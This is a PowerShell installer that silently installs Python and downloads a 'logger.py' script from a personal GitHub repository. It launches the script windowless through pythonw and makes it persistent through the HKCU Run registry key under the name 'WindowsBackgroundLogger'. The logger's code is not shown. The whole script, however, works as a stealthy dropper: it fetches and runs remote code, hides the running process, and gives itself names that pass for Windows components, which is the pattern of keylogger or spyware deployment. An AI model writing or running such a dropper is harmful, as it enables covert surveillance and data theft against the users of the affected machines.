# =============================================
#   Windows Automated Background Logger Setup
# =============================================

$installDir = "$env:LOCALAPPDATA\WindowsLogger"

if (!(Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}

$loggerUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/logger.py"
$reqUrl = "https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/requirements.txt"

Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "   Automated Logger Setup Process" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan

# 1. Check Python
Write-Host "[*] Checking for Python..." -ForegroundColor Yellow
$pythonInstalled = $false

if (Get-Command python -ErrorAction SilentlyContinue) {
    $pythonVersion = & python --version
    Write-Host "[+] Python is already installed: $pythonVersion" -ForegroundColor Green
    $pythonInstalled = $true
}

if (-not $pythonInstalled) {
    Write-Host "[-] Python not found. Downloading Python 3.12.8..." -ForegroundColor Yellow
    $pythonUrl = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
    $installerPath = "$env:TEMP\python_installer.exe"
    
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    
    Write-Host "[*] Installing Python silently..." -ForegroundColor Yellow
    $installArgs = "/quiet PrependPath=1 Include_test=0 Include_pip=1"
    Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -PassThru | Out-Null
    
    Remove-Item $installerPath -Force
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    Write-Host "[+] Python installed successfully!" -ForegroundColor Green
}

# 2. Download files
Write-Host "[*] Downloading script files..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $loggerUrl -OutFile "$installDir\logger.py" -TimeoutSec 30
    Invoke-WebRequest -Uri $reqUrl -OutFile "$installDir\requirements.txt" -TimeoutSec 30
    Write-Host "[+] Files downloaded successfully." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download files! Check your internet connection." -ForegroundColor Red
    Exit
}

# 3. Install requirements
Write-Host "[*] Installing required Python packages..." -ForegroundColor Yellow
Set-Location $installDir

python -m pip install --upgrade pip setuptools wheel --quiet

$pipArgs = @("-m", "pip", "install", "-r", "requirements.txt", "--no-cache-dir", "--timeout", "180", "--retries", "10", "--quiet")
$installResult = & python $pipArgs

if ($LASTEXITCODE -eq 0) {
    Write-Host "[+] All packages installed successfully." -ForegroundColor Green
} else {
    Write-Host "[!] Installation had issues. Trying alternative..." -ForegroundColor Yellow
    python -m pip install -r requirements.txt --no-cache-dir --timeout 200 --retries 15
}

# 4. Create start_logger.bat
Write-Host "[*] Creating startup batch file..." -ForegroundColor Yellow

$batContent = @'
@echo off
:: Silent Logger Starter
set PYTHONW=C:\Users\pkpat\AppData\Local\Programs\Python\Python312\pythonw.exe
set SCRIPT=C:\Users\pkpat\AppData\Local\WindowsLogger\logger.py

if not exist "%PYTHONW%" (
    set PYTHONW=pythonw
)

start "" "%PYTHONW%" "%SCRIPT%"
'@

$batPath = "$installDir\start_logger.bat"
$batContent | Out-File -FilePath $batPath -Encoding UTF8 -Force
Write-Host "[+] Batch file created successfully." -ForegroundColor Green

# 5. Add .bat file to Windows Startup
Write-Host "[*] Adding to Windows Startup..." -ForegroundColor Yellow

$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name "WindowsBackgroundLogger" -Value "`"$batPath`"" -ErrorAction SilentlyContinue

Write-Host "=============================================" -ForegroundColor Green
Write-Host "[✓] Setup completed successfully! Logger is now active." -ForegroundColor Green
Write-Host "[i] Installation folder: $installDir" -ForegroundColor Cyan
Write-Host "[i] Startup method: start_logger.bat" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Green
